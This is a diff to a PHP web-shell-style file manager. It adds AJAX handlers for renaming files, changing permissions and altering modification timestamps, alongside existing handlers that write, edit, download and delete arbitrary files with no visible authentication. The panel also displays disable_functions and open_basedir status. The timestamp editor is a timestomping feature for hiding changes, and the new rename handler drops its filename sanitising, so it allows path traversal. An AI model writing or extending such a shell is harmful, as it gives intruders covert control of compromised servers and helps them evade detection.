@@ -237,26 +237,22 @@ if (isset($_POST['savefile'], $_POST['filename'])) {
     file_put_contents($_POST['filename'], $_POST['savefile']);
     header("Location: ?path=" . urlencode(dirname($_POST['filename']))); exit;
 }
-if (isset($_POST['rename'], $_POST['old'], $_POST['new'])) {
-    $old = $_POST['old'];
-    $new = dirname($old) . DIRECTORY_SEPARATOR . basename($_POST['new']);
-    if (file_exists($old)) {
-        @rename($old, $new);
-    }
-    header("Location: ?path=" . urlencode(dirname($old)));
-    exit;
-}
+if (isset($_POST['ajax_rename'])) {
+    $old = $_POST['old'] ?? '';
+    $new = $_POST['new'] ?? '';
 
-// Touch/modify time handler (non-AJAX)
-if (isset($_POST['touch'], $_POST['file'], $_POST['time'])) {
-    $file = $_POST['file'];
-    $timeStr = $_POST['time'];
-    $timestamp = strtotime($timeStr);
-    if (file_exists($file) && $timestamp) {
-        @touch($file, $timestamp);
+    if (!file_exists($old)) {
+        exit(json_encode(['status' => 'error', 'message' => 'Original file not found']));
     }
-    header("Location: ?path=" . urlencode(dirname($file)));
-    exit;
+
+    $dir = dirname($old); // ambil direktori lama
+    $newPath = $dir . DIRECTORY_SEPARATOR . $new;
+
+    if (@rename($old, $newPath)) {
+        exit(json_encode(['status' => 'success']));
+    } else {
+        exit(json_encode(['status' => 'error', 'message' => 'Rename failed']));
+    }
 }
 
 // ⬇️ SISIPAN UNTUK CHMOD (Edit Permissions)
@@ -273,7 +269,41 @@ if (isset($_POST['chmod_file'], $_POST['chmod_val'])) {
         }
     }
 }
+// Handler AJAX untuk chmod
+if (isset($_POST['ajax_chmod'])) {
+    $file = $_POST['path'] ?? '';
+    $mode = $_POST['mode'] ?? '';
 
+    if (!file_exists($file)) {
+        exit(json_encode(['status' => 'error', 'message' => 'File not found']));
+    }
+
+    if (!preg_match('/^[0-7]{3,4}$/', $mode)) {
+        exit(json_encode(['status' => 'error', 'message' => 'Invalid chmod']));
+    }
+
+    if (chmod($file, octdec($mode))) {
+        exit(json_encode(['status' => 'success']));
+    } else {
+        exit(json_encode(['status' => 'error', 'message' => 'chmod failed']));
+    }
+}
+if (isset($_POST['ajax_modify'])) {
+    $file = $_POST['path'] ?? '';
+    $mtime = $_POST['mtime'] ?? '';
+    if (!file_exists($file)) {
+        exit(json_encode(['status' => 'error', 'message' => 'File not found']));
+    }
+    $time = strtotime($mtime);
+    if ($time === false) {
+        exit(json_encode(['status' => 'error', 'message' => 'Invalid datetime format']));
+    }
+    if (touch($file, $time)) {
+        exit(json_encode(['status' => 'success']));
+    } else {
+        exit(json_encode(['status' => 'error', 'message' => 'touch() failed']));
+    }
+}
 if (isset($_GET['edit']) && is_file($_GET['edit'])) {
     $f = $_GET['edit'];
     $c = htmlspecialchars(file_get_contents($f));
@@ -288,26 +318,12 @@ if (isset($_GET['edit']) && is_file($_GET['edit'])) {
     </div></form></div></body></html>"; exit;
 }
 
-if (isset($_POST['rename'], $_POST['old'], $_POST['new'])) {
-    $old = $_POST['old'];
-    $newName = basename($_POST['new']); // hanya nama file
-    $dir = dirname($old);
-    $new = $dir . DIRECTORY_SEPARATOR . $newName;
-
-    if (!file_exists($old)) {
-        echo "<div class='text-red-500 p-2'>❌ File asal tidak ditemukan</div>";
-    } elseif ($newName === basename($old)) {
-        // Nama tidak berubah
-        header("Location: ?path=" . urlencode($dir));
-        exit;
-    } elseif (file_exists($new)) {
-        echo "<div class='text-red-500 p-2'>❌ Nama baru sudah ada</div>";
-    } elseif (@rename($old, $new)) {
-        header("Location: ?path=" . urlencode($dir));
-        exit;
-    } else {
-        echo "<div class='text-red-500 p-2'>❌ Gagal mengganti nama</div>";
-    }
+if (isset($_POST['rename_from'], $_POST['rename_to'])) {
+    $from = $_POST['rename_from'];
+    $to = dirname($from) . DIRECTORY_SEPARATOR . basename($_POST['rename_to']);
+    rename($from, $to);
+    header("Location: ?path=" . urlencode(dirname($from)));
+    exit;
 }
 if (isset($_POST['target'], $_POST['perm'])) {
     chmod($_POST['target'], octdec($_POST['perm']));
@@ -450,40 +466,7 @@ $open_basedir = ini_get('open_basedir') ?: 'NONE';
       </div>
       <div><span class="text-blue-400 font-bold">Open_basedir:</span> <?= $open_basedir ?></div>
     </div>
-	<?php
-foreach ($files as $file) {
-    $filepath = $path . '/' . $file;
-    $perms = substr(sprintf('%o', fileperms($filepath)), -4);
-    // ... info size, owner, etc
-
-    echo "<tr>";
-    echo "<td>$file</td>"; // Name
-    echo "<td>$size</td>"; // Size
-    echo "<td class='p-2 text-center font-mono text-xs'>
-  <form method='POST' class='inline'>
-    <input type='hidden' name='touch' value='1'>
-    <input type='hidden' name='file' value='" . htmlspecialchars($full) . "'>
-    <input type='text' name='time' value='" . $mtime . "' size='19' maxlength='19'
-      class='bg-gray-900 border border-gray-600 rounded text-center text-cyan-300 w-44'
-      onchange='this.form.submit()' title='Format: YYYY-MM-DD HH:MM:SS'>
-  </form>
-</td>"; // Modify
-    echo "<td>$owner/$group</td>"; // Owner/Group
-
-    // ⬇️ Disimpan di sini (kolom "Permissions")
-    echo "<td class='p-2 text-center font-mono text-xs'>
-      <form method='POST' class='inline'>
-        <input type='hidden' name='chmod_file' value=\"" . htmlspecialchars($filepath) . "\">
-        <input type='text' name='chmod_val' value=\"$perms\" maxlength='4' size='4\"
-               class='bg-gray-900 border border-gray-600 rounded text-center w-16 text-white'>
-        <button type='submit' class='ml-1 text-blue-400 hover:underline'>Set</button>
-      </form>
-    </td>";
-
-    echo "<td>Actions</td>"; // Actions
-    echo "</tr>";
-}
-?>
+	
     <!-- Status open_basedir -->
     <?php
     function is_open_basedir_restricted() {
@@ -502,7 +485,7 @@ foreach ($files as $file) {
 <div>
   <span class="text-blue-300 font-bold">disable_functions:</span>
   <div class="mt-1 max-w-full overflow-x-auto bg-gray-900 p-2 rounded text-sm text-white">
-    <code><?= ini_get('disable_functions') ?: 'NONE' ?></code>
+    <code><?=ini_get('disable_functions') ?: 'NONE' ?></code>
   </div>
 </div>
 	<script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
@@ -642,7 +625,8 @@ foreach ($files as $file) {
 <table class="w-full table-auto border border-gray-700 text-sm">
   <thead>
   <tr class="bg-gray-800 text-left">
-    <th class="p-2">Name <span class="text-xs text-gray-400">(dbl click to rename)</span></th>
+    <th class="p-2">Name <span class="text-xs text-gray-400">(click [R] to rename)</span></th>
+
     <th class="p-2 text-center">Size</th>
     <th class="p-2 text-center">Modify</th>
     <th class="p-2 text-center">Owner/Group</th>
@@ -678,47 +662,50 @@ foreach ($files as $file) {
         $permStr .= $filePerms & 0x0002 ? 'w' : '-';
         $permStr .= $filePerms & 0x0001 ? 'x' : '-';
 
-        $nameDisplay = "<form method='POST' class='inline'>
-  <input type='hidden' name='rename' value='1'>
-  <input type='hidden' name='old' value='" . htmlspecialchars($full) . "'>
-  <input type='text' name='new' value='" . htmlspecialchars($f) . "'
-         class='bg-gray-900 border border-gray-600 rounded text-white text-center w-40'
-         onchange='this.form.submit()'>
-</form>";
+        $displayName = htmlspecialchars($f);
+$encodedFull = htmlspecialchars($full);
+
+if ($isDir) {
+    $nameDisplay = "<a href='?path=" . urlencode($full) . "' class='text-yellow-400 hover:underline'>| $displayName |</a>";
+} else {
+    $nameDisplay = "<span class='text-white'>| $displayName</span>";
+}
 
         $actions = [];
-        if (!$isDir) {
-            $actions[] = "<a href='?edit=" . urlencode($full) . "' class='text-green-400'>E</a>";
-            $actions[] = "<a href='?download=" . urlencode($full) . "&path=" . urlencode($dirReal) . "' class='text-blue-400'>D</a>";
-        }
-        $actions[] = "<a href='?del=" . urlencode($full) . "' class='text-red-400'>X</a>";
-        $actions[] = "<a href='?lock=" . urlencode($full) . "' class='text-gray-400'>L</a>";
-        $actions[] = "<a href='?unlock=" . urlencode($full) . "' class='text-white'>U</a>";
+
+if (!$isDir) {
+    $actions[] = "<a href='?edit=" . urlencode($full) . "' class='text-green-400'>E</a>";
+    $actions[] = "<a href='?download=" . urlencode($full) . "&path=" . urlencode($dirReal) . "' class='text-blue-400'>D</a>";
+}
+
+// [R] Rename untuk file & folder (semua)
+$actions[] = "
+  <button type='button' class='rename-btn text-lime-400 hover:text-white text-xs'
+          data-path='$encodedFull'
+          data-name='" . htmlspecialchars($f) . "'>[R]</button>";
+
+$actions[] = "<a href='?del=" . urlencode($full) . "' class='text-red-400'>X</a>";
+$actions[] = "<a href='?lock=" . urlencode($full) . "' class='text-gray-400'>L</a>";
+$actions[] = "<a href='?unlock=" . urlencode($full) . "' class='text-white'>U</a>";
 
         echo "<tr class='border-t border-gray-700'>
-  <td class='p-2'>$nameDisplay</td>
-  <td class='p-2 text-center'>$size</td>
-  <td class='p-2 text-center font-mono text-xs'>
-  <form method='POST' class='inline'>
-    <input type='hidden' name='ajax_touch' value='1'>
-    <input type='hidden' name='file' value='" . htmlspecialchars($full) . "'>
-    <input type='text' name='time' value='" . $mtime . "' size='19' maxlength='19'
-      class='bg-gray-900 border border-gray-600 rounded text-center text-cyan-300 w-44'
-      onchange='this.form.submit()' title='Format: YYYY-MM-DD HH:MM:SS'>
-  </form>
+          <td class='p-2'>$nameDisplay</td>
+          <td class='p-2 text-center'>$size</td>
+          <td class='p-2 text-center'>
+  <input type='text' value='$mtime' class='mtime-input bg-transparent border border-gray-600 w-44 text-center text-cyan-300' data-path='" . htmlspecialchars($full) . "' />
 </td>
-  <td class='p-2 text-center text-blue-300'>$owner/$group</td>
-  <td class='p-2 text-center font-mono text-xs'>
-    <form method='POST' class='inline'>
-      <input type='hidden' name='chmod_file' value='" . htmlspecialchars($full) . "'>
-      <input type='text' name='chmod_val' value='" . $perm . "' maxlength='4'
-        class='bg-gray-900 border border-gray-600 rounded text-center w-16 text-white'
-        onchange='this.form.submit()' title='Tekan Enter untuk ubah permission'>
-      <div class='text-lime-300 text-xs mt-1'>" . $permStr . "</div>
-    </form>
-  </td>
-  <td class='p-2 text-center space-x-2'>" . implode(' ', $actions) . "</td>
-</tr>";
+          <td class='p-2 text-center text-blue-300'>$owner/$group</td>
+          <td class='p-2 text-center'>
+  <input type='text' 
+         class='chmod-input bg-transparent text-green-400 border-b border-green-400 text-center w-16 outline-none focus:bg-gray-800' 
+         data-path='$encodedFull' 
+         value='$perm' 
+         title='Press Enter to apply chmod' />
+  <div class='text-xs text-lime-300 mt-1'>$permStr</div>
+</td>
+
+          <td class='p-2 text-center space-x-2'>" . implode(' ', $actions) . "</td>
+        </tr>";
     }
     ?>
   </tbody>
@@ -726,44 +713,79 @@ foreach ($files as $file) {
 
   </div>
 <script>
-document.querySelectorAll('td .rename').forEach(el => {
-  el.addEventListener('dblclick', () => {
-    const oldPath = el.getAttribute('data-path');
-    const currentName = el.textContent.trim();
-    const newName = prompt("Rename to:", currentName);
-    if (newName && newName !== currentName) {
+document.querySelectorAll('.chmod-input').forEach(input => {
+  input.addEventListener('keydown', e => {
+    if (e.key === 'Enter') {
+      const path = input.getAttribute('data-path');
+      const mode = input.value.trim();
+      if (!/^[0-7]{3,4}$/.test(mode)) {
+        alert('Invalid chmod (must be 3 or 4 digits octal)');
+        return;
+      }
       const formData = new FormData();
-      formData.append('ajax_rename', 1);
-      formData.append('old', oldPath);
-      formData.append('new', newName);
+      formData.append('ajax_chmod', 1);
+      formData.append('path', path);
+      formData.append('mode', mode);
       fetch('', {
         method: 'POST',
         body: formData
       }).then(r => r.json()).then(res => {
         if (res.status === 'success') location.reload();
-        else alert(res.message || 'Rename failed');
+        else alert(res.message || 'Chmod failed');
       });
     }
   });
 });
 </script>
 <script>
-// Simpan posisi scroll sebelum submit form
-document.querySelectorAll('form.inline input').forEach(input => {
+document.querySelectorAll('.mtime-input').forEach(input => {
   input.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
-      sessionStorage.setItem('scrollTop', window.scrollY);
+      e.preventDefault();      // 🛑 Mencegah form submit / refresh
+      e.stopPropagation();     // 🔇 Menghentikan bubbling event
+
+      const path = this.dataset.path;
+      const mtime = this.value.trim();
+      const formData = new FormData();
+      formData.append('ajax_modify', 1);
+      formData.append('path', path);
+      formData.append('mtime', mtime);
+      fetch('', {
+        method: 'POST',
+        body: formData
+      }).then(r => r.json()).then(res => {
+        if (res.status === 'success') location.reload();
+        else alert(res.message || 'Modify failed');
+      });
     }
   });
 });
+</script>
+<script>
+document.querySelectorAll('.rename-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const oldPath = btn.getAttribute('data-path');
+    const currentName = btn.getAttribute('data-name');
+    const newName = prompt("Rename to:", currentName);
 
-// Kembalikan posisi scroll setelah halaman reload
-window.addEventListener('load', () => {
-  const scrollTop = sessionStorage.getItem('scrollTop');
-  if (scrollTop !== null) {
-    window.scrollTo(0, parseInt(scrollTop));
-    sessionStorage.removeItem('scrollTop');
-  }
+    if (newName && newName !== currentName) {
+      const formData = new FormData();
+      formData.append('ajax_rename', 1);
+      formData.append('old', oldPath);
+      formData.append('new', newName);
+
+      fetch('', {
+        method: 'POST',
+        body: formData
+      }).then(res => res.json()).then(result => {
+        if (result.status === 'success') {
+          location.reload();
+        } else {
+          alert(result.message || 'Rename failed');
+        }
+      });
+    }
+  });
 });
 </script>
 </body>
